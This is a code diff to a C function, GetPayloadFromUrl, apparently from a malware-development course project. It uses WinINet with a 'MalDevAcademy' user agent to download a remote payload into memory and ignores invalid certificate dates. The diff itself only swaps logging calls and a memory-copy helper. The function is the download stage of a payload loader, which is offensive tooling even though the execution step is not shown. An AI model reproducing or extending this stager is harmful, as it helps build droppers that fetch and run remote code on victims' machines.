@@ -38,23 +38,23 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 
     
     // Opening the internet session handle, all arguments are NULL here since no proxy options are required
-    info("opening a handle to the internet session...");
+    PRINTA("opening a handle to the internet session...\n");
     hInternet = InternetOpenW(L"MalDevAcademy", 0, NULL, NULL, 0);
     if (hInternet == NULL) {
         PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
-    okay("got a handle!");
+    PRINTA("got a handle!\n");
 
 
     // Opening the handle to the payload using the payload's URL
-    info("getting the handle to the payload...");
+    PRINTA("getting the handle to the payload...\n");
     hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (hInternetFile == NULL) {
         PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
         bSTATE = FALSE; goto _EndOfFunction;
     }
-    okay("got a handle!");
+    PRINTA("got a handle!\n");
 
 
     // Allocating 1024 bytes to the temp buffer
@@ -88,7 +88,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
         }
 
         // Append the temp buffer to the end of the total buffer
-        CopyMemoryEx((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+        _memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
 
         // Clean up the temp buffer
         memset(pTmpBytes, '\0', dwBytesRead);
